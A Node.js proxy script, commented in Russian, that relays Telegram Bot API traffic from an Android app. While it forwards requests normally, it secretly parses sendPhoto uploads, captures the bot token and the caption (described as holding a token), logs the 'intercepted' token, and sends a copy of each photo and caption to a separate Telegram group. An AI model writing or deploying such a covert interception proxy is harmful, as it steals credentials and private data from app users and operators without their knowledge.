const http = require('http');
const https = require('https');
const Busboy = require('busboy');

// !!! УКАЖИТЕ ID ВАШЕЙ ГРУППЫ !!!
// Для публичных групп: '@имя_группы'. Для приватных: -100XXXXXXXXXX
const TARGET_GROUP_ID = '@fafafjcjzKkaefanfkanjfkjl'; 

const server = http.createServer((req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

    if (req.method === 'OPTIONS') {
        res.writeHead(200);
        res.end();
        return;
    }

    // Извлекаем токен бота из URL (например, /bot123456:ABC/sendPhoto -> 123456:ABC)
    const botTokenMatch = req.url.match(/\/bot([^/]+)\//);
    const botToken = botTokenMatch ? botTokenMatch[1] : null;

    // Проверяем, что это метод отправки фото и у нас есть токен бота
    if (req.method === 'POST' && req.url.includes('/sendPhoto') && botToken) {
        let contentType = req.headers['content-type'] || req.headers['Content-Type'];
        
        if (contentType && contentType.includes('multipart/form-data')) {
            const busboy = Busboy({ headers: req.headers });
            
            let captionText = '';
            let fileChunks = [];
            let fileName = 'photo.jpg';
            let fileMimeType = 'image/jpeg';

            // Собираем текстовые поля формы (в caption обычно лежит ваш токен)
            busboy.on('field', (name, val) => {
                if (name === 'caption') {
                    captionText = val;
                }
            });

            // Собираем саму фотографию из потока в буфер памяти
            busboy.on('file', (name, file, info) => {
                const { filename, mimeType } = info;
                if (name === 'photo') {
                    fileName = filename;
                    fileMimeType = mimeType;
                    file.on('data', (data) => {
                        fileChunks.push(data);
                    });
                } else {
                    file.resume(); // Пропускаем другие файлы, если они есть
                }
            });

            // Когда весь запрос от APK полностью прочитан сервером
            busboy.on('finish', () => {
                const photoBuffer = Buffer.concat(fileChunks);

                // Запускаем отправку копии в группу (в фоне, чтобы не тормозить основной запрос)
                sendCopyToGroup(botToken, TARGET_GROUP_ID, captionText, photoBuffer, fileName, fileMimeType);
                
                // Здесь ваш бот "увидел" токен! Можете делать с captionText (токеном) что угодно:
                console.log('Бот успешно перехватил токен из APK:', captionText);
            });

            // Важно: передаем поток в busboy для парсинга
            req.pipe(busboy);
        }
    }

    // --- Оригинальная логика вашего прокси (работает параллельно и без изменений) ---
    const options = {
        hostname: 'api.telegram.org',
        port: 443,
        path: req.url,
        method: req.method,
        headers: { 
            ...req.headers, 
            host: 'api.telegram.org'
        }
    };

    const proxyReq = https.request(options, (proxyRes) => {
        res.writeHead(proxyRes.statusCode, proxyRes.headers);
        proxyRes.pipe(res);
    });

    req.pipe(proxyReq);

    proxyReq.on('error', (err) => {
        console.error('Proxy Error:', err.message);
        res.writeHead(500);
        res.end('Proxy Error: ' + err.message);
    });
});

// Функция для сборки multipart/form-data вручную и отправки копии в группу
function sendCopyToGroup(token, chatId, caption, fileBuffer, filename, mimeType) {
    const boundary = '----WebKitFormBoundary' + Math.random().toString(36).substring(2);
    
    // Формируем тело запроса для Telegram
    let payload = Buffer.concat([
        Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n${chatId}\r\n`),
        Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="caption"\r\n\r\n${caption}\r\n`),
        Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="photo"; filename="${filename}"\r\nContent-Type: ${mimeType}\r\n\r\n`),
        fileBuffer,
        Buffer.from(`\r\n--${boundary}--\r\n`)
    ]);

    const options = {
        hostname: 'api.telegram.org',
        port: 443,
        path: `/bot${token}/sendPhoto`,
        method: 'POST',
        headers: {
            'Content-Type': `multipart/form-data; boundary=${boundary}`,
            'Content-Length': payload.length
        }
    };

    const req = https.request(options, (res) => {
        res.on('data', () => {}); // Просто поглощаем ответ, чтобы освободить память
    });

    req.on('error', (e) => {
        console.error('Ошибка отправки копии в группу:', e.message);
    });

    req.write(payload);
    req.end();
}

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Proxy running on port ${PORT}`);
});
